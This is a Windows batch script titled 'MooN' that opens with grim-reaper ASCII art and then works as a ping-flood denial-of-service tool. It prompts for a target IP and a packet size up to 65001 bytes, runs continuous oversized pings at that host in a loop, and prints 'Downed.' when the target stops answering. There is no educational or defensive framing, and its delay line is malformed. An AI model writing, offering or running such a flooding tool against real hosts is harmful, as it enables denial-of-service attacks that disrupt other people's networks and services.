@echo off
color 4

title MooN

:greeting
cls

ECHO                ...                            
ECHO              ;::::;                           
ECHO            ;::::; :;                          
ECHO         ;:::::'   :;                         
ECHO         ;:::::;     ;.                        
ECHO        ,:::::'       ;           OOO\         
ECHO        ::::::;       ;          OOOOO\        
ECHO        ;:::::;       ;         OOOOOOOO       
ECHO      ,;::::::;     ;'         / OOOOOOO      
ECHO     ;:::::::::`. ,,,;.        /  / DOOOOOO    
ECHO   .';:::::::::::::::::;,     /  /     DOOOO   
ECHO  ,::::::;::::::;;;;::::;,   /  /        DOOO  
ECHO ;`::::::`'::::::;;;::::: ,#/  /          DOOO 
ECHO :`:::::::`;::::::;;::: ;::#  /            DOOO
ECHO ::`:::::::`;:::::::: ;::::# /              DOO
ECHO `:`:::::::`;:::::: ;::::::#/               DOO
ECHO  :::`:::::::`;; ;:::::::::##                OO
ECHO  ::::`:::::::`;::::::::;:::#                OO
ECHO  `:::::`::::::::::::;'`:;::#                O 
ECHO   `:::::`::::::::;' /  / `:#                  
ECHO    ::::::`:::::;'  /  /   `#  

set /p IP=Enter IP=
:top
set /p bytes=enter ammount of bytes here(max 65001)=
cls
ping %ip% -t -l %bytes%
cls
IF ERRORLEVEL 1 (SET in=0b & echo Downed.) 
color %in%
ping -t 2 0 10 127.0.0.1 >nul
GoTo top 
